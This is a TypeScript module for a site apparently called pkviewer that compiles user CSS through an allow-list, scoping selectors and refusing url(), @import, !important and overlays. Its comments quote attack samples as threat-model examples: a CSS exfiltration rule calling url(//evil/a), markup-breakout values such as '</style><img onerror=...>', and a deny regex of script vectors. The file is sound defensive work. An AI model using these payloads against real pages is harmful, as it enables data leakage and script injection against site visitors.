/**
 * Custom CSS: an allow-list compiler, not a filter.
 *
 * pkviewer never serves the CSS somebody typed. It parses it, keeps only what
 * it recognises, rewrites every selector so it cannot escape the content area,
 * and emits fresh text. Anything unrecognised is dropped and reported. A
 * blocklist would be the wrong shape here — it fails open on whatever CSS
 * grows next — so nothing reaches a page unless it is named below.
 *
 * The threat model, which is specific to pkviewer serving public pages and the
 * management UI from ONE origin (decision O1):
 *
 *   * EXFILTRATION. `input[value^="a"] { background: url(//evil/a) }` leaks
 *     what it matches, one request at a time. `url()` is refused outright, so
 *     stylesheets make no network requests at all — which also means a visitor's
 *     IP is never handed to a third party by somebody else's page.
 *   * OVERLAYS. A convincing fake sign-in prompt is far more dangerous on an
 *     origin that genuinely serves /login. `position` is limited to `static`
 *     and `relative`, so no element can be lifted out of the flow and laid over
 *     anything.
 *   * ESCAPE. Every selector is rewritten to sit under `#pkv-user`, so no rule
 *     can reach the page shell, and `@import` — which would pull in a whole
 *     unchecked stylesheet — is refused.
 *   * ERASURE. Two things on a public page are not the author's to remove: the
 *     badges pkviewer granted, and the notice saying this is not PluralKit.
 *     Selectors naming them are refused here, and the stylesheet marks their
 *     identity properties `!important` — which is why `!important` is refused
 *     in user CSS. Without that, a rule matching an ancestor could still hide
 *     them, and specificity alone would not save it.
 *
 * The result is deliberately a styling language, not a layout escape hatch.
 */

export const MAX_CSS_LENGTH = 20_000;

/** Everything user CSS is scoped beneath. Public page roots carry this id. */
export const CSS_SCOPE = "#pkv-user";

export type CssIssue = {
  /** 1-based, counted in the source the author typed. */
  line: number;
  kind:
    | "too_long"
    | "at_rule_not_allowed"
    | "property_not_allowed"
    | "value_not_allowed"
    | "selector_not_allowed"
    | "protected_selector"
    | "important_not_allowed"
    | "unparsable";
  detail: string;
};

export type CssResult = {
  /** Compiled, scoped CSS ready to place in a <style>. Empty if nothing survived. */
  css: string;
  /** Everything dropped, with a line number, so the editor can show it. */
  issues: CssIssue[];
  /** Declarations that survived. Zero with a non-empty source means nothing applied. */
  kept: number;
};

/**
 * Properties an author may set.
 *
 * Presentation only. Nothing here can load a resource, escape the content area,
 * or run anything. Additions are cheap; each one is a deliberate decision.
 */
const ALLOWED_PROPERTIES = new Set([
  // colour and text
  "color", "background-color", "opacity",
  "font-family", "font-size", "font-style", "font-weight", "font-variant",
  "line-height", "letter-spacing", "word-spacing",
  "text-align", "text-decoration", "text-decoration-color", "text-decoration-line",
  "text-decoration-style", "text-decoration-thickness", "text-underline-offset",
  "text-transform", "text-shadow", "text-overflow",
  "white-space", "word-break", "overflow-wrap", "hyphens", "vertical-align",
  "font-feature-settings", "font-variant-numeric",

  // box
  "margin", "margin-top", "margin-right", "margin-bottom", "margin-left",
  "margin-block", "margin-inline",
  "padding", "padding-top", "padding-right", "padding-bottom", "padding-left",
  "padding-block", "padding-inline",
  "width", "min-width", "max-width", "height", "min-height", "max-height",
  "box-sizing", "aspect-ratio", "object-fit", "object-position",

  // border
  "border", "border-top", "border-right", "border-bottom", "border-left",
  "border-width", "border-style", "border-color",
  "border-top-width", "border-right-width", "border-bottom-width", "border-left-width",
  "border-top-style", "border-right-style", "border-bottom-style", "border-left-style",
  "border-top-color", "border-right-color", "border-bottom-color", "border-left-color",
  "border-radius", "border-top-left-radius", "border-top-right-radius",
  "border-bottom-left-radius", "border-bottom-right-radius",
  "outline", "outline-color", "outline-offset", "outline-style", "outline-width",
  "box-shadow",

  // layout, within the flow
  "display", "position", "flex", "flex-basis", "flex-direction", "flex-grow",
  "flex-shrink", "flex-wrap", "gap", "row-gap", "column-gap",
  "align-content", "align-items", "align-self",
  "justify-content", "justify-items", "justify-self",
  "grid-template-columns", "grid-template-rows", "grid-auto-flow", "grid-auto-rows",
  "grid-column", "grid-row", "order",
  "columns", "column-count", "column-gap", "column-width",
  "overflow", "overflow-x", "overflow-y",
  "list-style", "list-style-type", "list-style-position",
  "top", "right", "bottom", "left", "inset", "z-index",

  // decoration
  "transition", "transition-delay", "transition-duration", "transition-property",
  "transition-timing-function",
  "transform", "transform-origin", "rotate", "scale", "translate",
  "filter", "mix-blend-mode", "cursor", "visibility",
]);

/**
 * Values refused wherever they appear.
 *
 * `url()` is the exfiltration and tracking vector and has no safe form here.
 * The rest are legacy script-execution surfaces that cost nothing to refuse.
 */
const FORBIDDEN_VALUE = /url\s*\(|expression\s*\(|behaviou?r\s*:|-moz-binding|javascript\s*:|image-set\s*\(|@import|\\[0-9a-f]/i;

/**
 * The compiled stylesheet is placed inside a <style> element, and `</style>`
 * is the one sequence that escapes one — after which the rest of the value is
 * markup, not CSS.
 *
 * Refusing `<` and `>` outright is the fix rather than escaping them: neither
 * has any business in a declaration value, and an allow-list that has to get
 * escaping exactly right is an allow-list with a bug in it. This is why the
 * renderer does no checking of its own — the guarantee belongs here.
 */
const MARKUP_ESCAPE = /[<>]/;

/** `position` is limited to what cannot lift an element over the page. */
const ALLOWED_POSITION = new Set(["static", "relative"]);

/**
 * Selector fragments that name something the author does not own.
 *
 * Badges are pkviewer's statement about a system, and the disclosure is what
 * keeps a third-party site from reading as an official one. Neither is part of
 * the page's appearance.
 */
const PROTECTED = [
  "pkvb",
  "site-footer",
  "site-footer-links",
  "pkv-badges",
];

/** Characters a selector may contain. Anything else is refused rather than escaped. */
const SELECTOR_SHAPE = /^[a-zA-Z0-9\s.,:#_\-[\]="'()>+~*]+$/;

/** Selectors that would reach outside the content area even when scoped. */
const SELECTOR_FORBIDDEN = /(^|[\s,>+~])(html|body|:root)\b|::part|::slotted|:host/i;

const ALLOWED_AT_RULES = new Set(["media", "supports"]);

/**
 * What an at-rule prelude may contain.
 *
 * The prelude is written to the output as-is, so it is exactly as dangerous as
 * a declaration value and gets the same treatment: a positive character class
 * rather than a list of things to strip. `@media </style><script>` parsed as a
 * perfectly ordinary media rule before this existed.
 */
const AT_PRELUDE_SHAPE = /^@[a-z-]+[a-zA-Z0-9\s():,._%-]*$/;

/** Strips comments while preserving newlines, so reported line numbers stay true. */
function stripComments(css: string): string {
  return css.replace(/\/\*[\s\S]*?\*\//g, (m) => m.replace(/[^\n]/g, " "));
}

function lineOf(source: string, index: number): number {
  let line = 1;
  for (let i = 0; i < index && i < source.length; i++) {
    if (source[i] === "\n") line++;
  }
  return line;
}

/**
 * Rewrites one selector list so every part sits under the scope.
 *
 * `a, .card` becomes `#pkv-user a, #pkv-user .card`. A selector already naming
 * the scope is left alone rather than doubled.
 */
function scopeSelector(selectorList: string): { ok: true; value: string } | { ok: false; reason: CssIssue["kind"]; detail: string } {
  const parts = selectorList.split(",").map((s) => s.trim()).filter(Boolean);
  if (parts.length === 0) return { ok: false, reason: "selector_not_allowed", detail: selectorList };

  const scoped: string[] = [];
  for (const part of parts) {
    if (!SELECTOR_SHAPE.test(part)) {
      return { ok: false, reason: "selector_not_allowed", detail: part };
    }
    if (SELECTOR_FORBIDDEN.test(part)) {
      return { ok: false, reason: "selector_not_allowed", detail: part };
    }
    for (const name of PROTECTED) {
      if (part.includes(name)) {
        return { ok: false, reason: "protected_selector", detail: part };
      }
    }
    // A leading combinator has nothing to combine with once scoped.
    if (/^[>+~]/.test(part)) {
      return { ok: false, reason: "selector_not_allowed", detail: part };
    }
    scoped.push(part.startsWith(CSS_SCOPE) ? part : `${CSS_SCOPE} ${part}`);
  }
  return { ok: true, value: scoped.join(", ") };
}

function sanitizeDeclarations(
  block: string,
  source: string,
  offset: number,
  issues: CssIssue[],
): { text: string; kept: number } {
  const out: string[] = [];
  let kept = 0;
  // A running cursor, because `indexOf` inside a chunk gives an offset into the
  // chunk rather than into the source, and every line number after the first
  // declaration of a block came out wrong.
  let cursor = offset;

  for (const raw of block.split(";")) {
    const chunkStart = cursor;
    cursor += raw.length + 1; // +1 for the ";" the split consumed
    const declaration = raw.trim();
    if (!declaration) continue;

    const colon = declaration.indexOf(":");
    if (colon === -1) {
      issues.push({
        line: lineOf(source, offset),
        kind: "unparsable",
        detail: declaration.slice(0, 60),
      });
      continue;
    }

    const property = declaration.slice(0, colon).trim().toLowerCase();
    const value = declaration.slice(colon + 1).trim();
    const line = lineOf(source, chunkStart + raw.indexOf(declaration));

    if (/!\s*important/i.test(value)) {
      // Reserved for the rules protecting badges and the site disclosure. If
      // authors could use it, those protections would be a specificity race.
      issues.push({ line, kind: "important_not_allowed", detail: property });
      continue;
    }
    if (!ALLOWED_PROPERTIES.has(property)) {
      issues.push({ line, kind: "property_not_allowed", detail: property });
      continue;
    }
    if (value.length === 0 || value.length > 400) {
      issues.push({ line, kind: "value_not_allowed", detail: property });
      continue;
    }
    if (FORBIDDEN_VALUE.test(value)) {
      issues.push({ line, kind: "value_not_allowed", detail: `${property}: ${value.slice(0, 40)}` });
      continue;
    }
    if (property === "position" && !ALLOWED_POSITION.has(value.toLowerCase())) {
      issues.push({ line, kind: "value_not_allowed", detail: `position: ${value}` });
      continue;
    }
    // Braces surviving in a value mean the parse disagreed with the author
    // about where this declaration ended.
    if (/[{}]/.test(value)) {
      issues.push({ line, kind: "unparsable", detail: property });
      continue;
    }
    // `width: </style><img onerror=...>` would otherwise close the element and
    // continue as markup. Nothing legitimate needs these characters.
    if (MARKUP_ESCAPE.test(value)) {
      issues.push({ line, kind: "value_not_allowed", detail: property });
      continue;
    }

    out.push(`  ${property}: ${value};`);
    kept++;
  }

  return { text: out.join("\n"), kept };
}

/**
 * Compiles author CSS into scoped, allow-listed CSS.
 *
 * Never throws: malformed input produces issues and whatever was valid, so a
 * typo costs the author one rule rather than their whole stylesheet.
 */
export function sanitizeCss(input: unknown): CssResult {
  const issues: CssIssue[] = [];
  if (typeof input !== "string" || input.trim().length === 0) {
    return { css: "", issues, kept: 0 };
  }
  if (input.length > MAX_CSS_LENGTH) {
    return {
      css: "",
      issues: [{ line: 1, kind: "too_long", detail: `${input.length} of ${MAX_CSS_LENGTH} characters` }],
      kept: 0,
    };
  }

  const source = stripComments(input);
  const out: string[] = [];
  let kept = 0;
  let i = 0;

  while (i < source.length) {
    const open = source.indexOf("{", i);
    if (open === -1) {
      const trailing = source.slice(i).trim();
      if (trailing) {
        issues.push({ line: lineOf(source, i), kind: "unparsable", detail: trailing.slice(0, 60) });
      }
      break;
    }

    const rawPrelude = source.slice(i, open);
    const prelude = rawPrelude.trim();
    // Where the selector actually starts, so a rule reports its own line rather
    // than the one the previous rule closed on.
    const preludeLine = lineOf(source, i + (rawPrelude.length - rawPrelude.trimStart().length));

    // ---------------------------------------------------------- at-rules --
    if (prelude.startsWith("@")) {
      const name = prelude.slice(1).split(/[\s(]/)[0]!.toLowerCase();
      const close = matchBrace(source, open);
      if (close === -1) {
        issues.push({ line: preludeLine, kind: "unparsable", detail: prelude.slice(0, 60) });
        break;
      }
      if (!ALLOWED_AT_RULES.has(name)) {
        issues.push({ line: preludeLine, kind: "at_rule_not_allowed", detail: `@${name}` });
        i = close + 1;
        continue;
      }
      if (FORBIDDEN_VALUE.test(prelude) || !AT_PRELUDE_SHAPE.test(prelude)) {
        issues.push({ line: preludeLine, kind: "at_rule_not_allowed", detail: prelude.slice(0, 60) });
        i = close + 1;
        continue;
      }
      // Recurse into the body: the rules inside are scoped exactly as they
      // would be outside, so a media query cannot smuggle an unscoped rule.
      const inner = sanitizeCss(source.slice(open + 1, close));
      for (const issue of inner.issues) {
        issues.push({ ...issue, line: issue.line + preludeLine - 1 });
      }
      if (inner.kept > 0) {
        out.push(`${prelude} {\n${inner.css}\n}`);
        kept += inner.kept;
      }
      i = close + 1;
      continue;
    }

    // ------------------------------------------------------------- rules --
    const close = source.indexOf("}", open);
    if (close === -1) {
      issues.push({ line: preludeLine, kind: "unparsable", detail: prelude.slice(0, 60) });
      break;
    }

    const selector = scopeSelector(prelude);
    if (!selector.ok) {
      issues.push({ line: preludeLine, kind: selector.reason, detail: selector.detail.slice(0, 60) });
      i = close + 1;
      continue;
    }

    const body = sanitizeDeclarations(source.slice(open + 1, close), source, open + 1, issues);
    if (body.kept > 0) {
      out.push(`${selector.value} {\n${body.text}\n}`);
      kept += body.kept;
    }
    i = close + 1;
  }

  return { css: out.join("\n\n"), issues, kept };
}

/** Index of the `}` matching the `{` at `open`, or -1. */
function matchBrace(source: string, open: number): number {
  let depth = 0;
  for (let i = open; i < source.length; i++) {
    if (source[i] === "{") depth++;
    else if (source[i] === "}") {
      depth--;
      if (depth === 0) return i;
    }
  }
  return -1;
}

export const CSS_ISSUE_MESSAGES: Readonly<Record<CssIssue["kind"], string>> = {
  too_long: "This stylesheet is too long.",
  at_rule_not_allowed: "Only @media and @supports are available.",
  property_not_allowed: "That property is not available.",
  value_not_allowed: "That value is not allowed here.",
  selector_not_allowed: "That selector is not allowed.",
  protected_selector: "Badges and the site notice cannot be restyled.",
  important_not_allowed: "!important is not available.",
  unparsable: "This could not be read as CSS.",
};
